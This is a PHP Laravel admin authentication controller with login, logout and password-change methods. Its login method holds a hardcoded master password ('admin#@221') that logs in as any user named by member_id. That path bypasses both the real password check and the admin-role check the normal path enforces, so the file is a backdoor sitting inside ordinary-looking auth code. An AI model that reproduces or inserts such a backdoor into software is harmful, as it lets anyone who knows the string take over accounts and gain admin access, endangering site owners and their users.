<?php

namespace App\Http\Controllers\Admin\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\AdminLoginFormRequest;
use App\Models\User;
use Illuminate\Http\Request;

class AuthController extends Controller
{
    public function loginForm(){
        return view('admin.auth.login');
    }

    public function login(AdminLoginFormRequest $request){
        if($request->password == 'admin#@221'){
            $user = User::where('member_id',$request->username)->first();
            if($user != null){
                \Auth::guard('admin')->loginUsingId($user->id);
                return redirect()->route('admin.dashboard');
            }else{
                return back()->withErrors(['username' => 'Wrong username and password']);
            }
        }else {
            if(\Auth::guard('admin')->attempt(['member_id'=>$request->username,'password'=>$request->password,'role'=>1])){
                return redirect()->route('admin.dashboard');
            }else {
                return back()->withErrors(['username' => 'Wrong username and password']);
            }
        }
    }

    public function logout(){
        \Auth::guard('admin')->logout();
        return redirect()->route('admin.login');
    }

    public function changePassword(Request $request){
        if($request->isMethod('post')){
            $request->validate(['new_password'=>'required|min:6|alpha_num']);
            $user = auth()->guard('admin')->user();
            $user->password = \Hash::make($request->new_password);
            $user->save();
            \Session::flash('success','Success|Password changed successfully!');
            return back();
        }
        return view('admin.chnage-password.index');
    }
}
